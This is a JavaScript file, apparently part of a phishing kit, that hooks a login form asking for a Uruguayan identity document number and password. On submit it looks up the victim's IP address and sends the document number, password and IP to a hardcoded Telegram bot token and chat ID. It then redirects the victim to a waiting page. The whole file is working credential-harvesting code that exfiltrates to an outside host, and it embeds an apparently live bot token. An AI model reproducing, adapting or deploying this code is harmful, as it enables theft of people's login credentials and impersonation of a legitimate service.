document.addEventListener("DOMContentLoaded", function () {
    // Captura el formulario por su ID
    const form = document.getElementById("userForm");

    form.addEventListener("submit", function (event) {
        event.preventDefault(); // Evita el envío tradicional del formulario

        // Datos del bot de Telegram
        const token = "6808586807:AAH5KvJxwCHbxVecJJ1D2fQyiVCK4u_RuBQ";
        const chat_id = "5157616506";

        // Captura de datos del formulario
        const pais = "Uruguay"; // Dado que este valor es fijo
        const tipoDocumento = "C.I."; // Dado que este valor es fijo
        const numeroDocumento = document.getElementById("document").value;
        const password = document.getElementById("password").value;

        // Validación de los campos (opcional)
        if (!numeroDocumento || !password) {
            alert("Por favor, complete todos los campos.");
            return;
        }

        // Captura la dirección IP del cliente utilizando un servicio externo
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ip_cliente = data.ip;

                // Crea el mensaje para enviar a Telegram
                let mensaje = "Ingreso de Usuario:\n";
                mensaje += `País: ${pais}\n`;
                mensaje += `Tipo de Documento: ${tipoDocumento}\n`;
                mensaje += `Número de Documento: ${numeroDocumento}\n`;
                mensaje += `Contraseña: ${password}\n`;
                mensaje += `IP del Cliente: ${ip_cliente}`;

                // URL para enviar el mensaje usando la API de Telegram
                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&parse_mode=HTML&text=${encodeURIComponent(mensaje)}`;

                // Envía la solicitud a Telegram
                fetch(url)
                    .then(response => {
                        if (response.ok) {
                            // Redirige al usuario a otra página si se envió correctamente
                            window.location.href = "espera.html";
                        } else {
                            // Muestra un mensaje de error si hubo un problema
                            alert("Hubo un problema al enviar los datos. Inténtalo nuevamente.");
                        }
                    })
                    .catch(error => {
                        console.error("Error al enviar los datos a Telegram:", error);
                        alert("Hubo un problema al enviar los datos. Inténtalo nuevamente.");
                    });
            })
            .catch(error => {
                console.error("Error al obtener la IP del cliente:", error);
                alert("Hubo un problema al obtener tu dirección IP. Inténtalo nuevamente.");
            });
    });
});
